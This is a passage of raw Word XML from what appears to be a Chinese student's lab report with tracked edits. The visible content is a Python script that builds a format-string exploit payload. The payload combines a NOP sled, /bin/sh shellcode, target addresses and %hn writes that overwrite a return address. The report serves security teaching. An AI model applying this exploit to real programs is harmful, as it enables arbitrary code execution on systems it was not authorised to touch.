                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="0000FF"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>0x</w:delText>
                              </w:r>
                            </w:del>
                            <w:del w:id="207" w:author="zhao ruizhi" w:date="2023-05-08T16:35:00Z">
                              <w:r>
                                <w:rPr>
                                  <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                  <w:color w:val="098658"/>
                                  <w:kern w:val="0"/>
                                  <w:sz w:val="20"/>
                                  <w:szCs w:val="20"/>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:lang w:bidi="ar"/>
                                </w:rPr>
                                <w:delText>d134</w:delText>
                              </w:r>
                            </w:del>
                          </w:p>
                          <w:p w14:paraId="14E3FC1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w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>"%.8x"</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15</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> + </w:t>
                            </w:r>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 xml:space="preserve"> + str(small) + </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x%hn</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094B038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 str(large) + </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x%hn</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1DD23D1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r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>fmt</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>=(s</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>).encode</w:t>
                            </w:r>
                            <w:proofErr w:type="gram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257E4AF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+len(</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>fmt</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>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fmt</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="790D99C6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="19D130C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把构造好的字符串写入</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>badfile</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>文件</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0949E34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file=open(</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badfile</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wb</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72A17E4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proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>file.write</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>(content)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="38762EF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proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>file.close</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>()</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="28F4134B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:spacing w:after="240"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="3694F71E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" upright="1">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="34226533" id="文本框 27" o:spid="_x0000_s1036" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:115.5pt;margin-top:4.5pt;width:389.6pt;height:521.5pt;z-index:-2516469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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="6E38E3A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8000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>#!/</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>usr/bin/python3</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="17816D82" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>import</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> sys</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5B52DBC8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="14C67368"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shellcode</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>=(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                    </w:p>
                    <w:p w14:paraId="1C4617E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"\x31\xc0\x31\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>xdb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>\xb0\xd5\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>xcd</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>\x80"</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="480FB87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"\x31\xc0\x50\x68//</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>sh</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>\x68/bin\x89\xe3\x50"</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1E243B8B"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A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"\x53\x89\xe1\x99\xb0\x0b\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>xcd</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>\x80\x00"</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6F0D1192" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>).encode</w:t>
                      </w:r>
                      <w:proofErr w:type="gram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6367F237"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N=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>200</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="25C422A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往字符串中填满NOP</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7071AE5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content=</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>bytearray</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>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90</w:t>
                      </w:r>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for</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>in</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> range(N))</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="543930DE"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把shellcode放在尾部</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="31148D9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start= N-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>len</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>(shellcode)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7C88A4A1"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content[start</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>:]=</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>shellcode</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2120BF55"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#把返回值的地址放在格式化字符串的头部</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0058E9B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addr1=</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ffff</w:t>
                      </w:r>
                      <w:ins w:id="208" w:author="zhao ruizhi" w:date="2023-05-08T16:39:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:t>cfb8</w:t>
                        </w:r>
                      </w:ins>
                      <w:ins w:id="209" w:author="zhao ruizhi" w:date="2023-05-08T16:40:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:t xml:space="preserve"> </w:t>
                        </w:r>
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                            <w:rPrChange w:id="210" w:author="zhao ruizhi" w:date="2023-05-08T16:44:00Z">
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                            </w:rPrChange>
                          </w:rPr>
                          <w:t>+ 4</w:t>
                        </w:r>
                      </w:ins>
                      <w:del w:id="211" w:author="zhao ruizhi" w:date="2023-05-08T16:39:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>d08c</w:delText>
                        </w:r>
                      </w:del>
                    </w:p>
                    <w:p w14:paraId="6E09B530" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>addr2=</w:t>
                      </w:r>
                      <w:ins w:id="212" w:author="zhao ruizhi" w:date="2023-05-08T16:37:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
